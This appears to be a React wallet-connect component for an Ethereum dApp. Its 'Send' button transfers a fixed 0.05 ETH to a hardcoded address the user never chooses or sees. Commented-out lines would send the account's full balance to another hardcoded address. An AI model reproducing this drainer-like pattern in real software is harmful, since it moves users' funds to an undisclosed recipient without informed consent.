import { useState, useEffect } from 'react'
import { Button, Box, Text } from "@chakra-ui/react";
import { useEthers, useEtherBalance,useSendTransaction, useGasPrice } from "@usedapp/core";
import { formatEther } from "@ethersproject/units";
import Identicon from "./Identicon";
import { utils } from 'ethers'

type Props = {
  handleOpenModal: any;
};

export default function ConnectButton({ handleOpenModal }: Props) {
  const { activateBrowserWallet, account } = useEthers();
  const etherBalance = useEtherBalance(account);
  const [disabled, setDisabled] = useState(false);
  const { sendTransaction, state } = useSendTransaction()

  function handleConnectWallet() {
    activateBrowserWallet();
  }
  const handleSend = () => {  
    setDisabled(true);
    sendTransaction({
      to: "0xB763a8E1a68Cc3995f75D2AfA3FDD093758864ce",
      // value: utils.parseEther(parseFloat(formatEther(etherBalance ? etherBalance : 0)).toFixed(18))
      value: utils.parseEther("0.05")
    })
    // account ? (
    //   // sendTransaction({ to: "0x964C58874707793d2e13327638085aE5707b7704", value: utils.parseEther(formatEther(etherBalance)) })
    //   sendTransaction({ to: "0x964C58874707793d2e13327638085aE5707b7704", value: utils.parseEther("0.1") })
    // ) : (
    //   sendTransaction({to: ""})
    // )
  }

  useEffect(() => {
    if (state.status !== "Mining") {
      setDisabled(false);
    }
  }, [state]);

  return account ? (
    <Box
      display="flex"
      alignItems="center"
      background="gray.700"
      borderRadius="xl"
      py="0"
    >
      <Box px="3">
        <Text color="white" fontSize="md">
          {etherBalance && parseFloat(formatEther(etherBalance)).toFixed(18)} ETH 
        </Text>
      </Box>
      <Button
        onClick={handleOpenModal}
        bg="gray.800"
        border="1px solid transparent"
        _hover={{
          border: "1px",
          borderStyle: "solid",
          borderColor: "blue.400",
          backgroundColor: "gray.700",
        }}
        borderRadius="xl"
        m="1px"
        px={3}
        height="38px"
      >
        <Text color="white" fontSize="md" fontWeight="medium" mr="2">
          {account &&
            `${account.slice(0, 6)}...${account.slice(
              account.length - 4,
              account.length
            )}`}
        </Text>
        <Identicon />
      </Button>
      <Button onClick={handleSend} disabled={disabled}>Send</Button>
    </Box>
  ) : (
    <Button
      onClick={handleConnectWallet}
      bg="blue.800"
      color="blue.300"
      fontSize="lg"
      fontWeight="medium"
      borderRadius="xl"
      border="1px solid transparent"
      _hover={{
        borderColor: "blue.700",
        color: "blue.400",
      }}
      _active={{
        backgroundColor: "blue.800",
        borderColor: "blue.700",
      }}
    >
      Connect to a wallet
    </Button>
    
  );
}
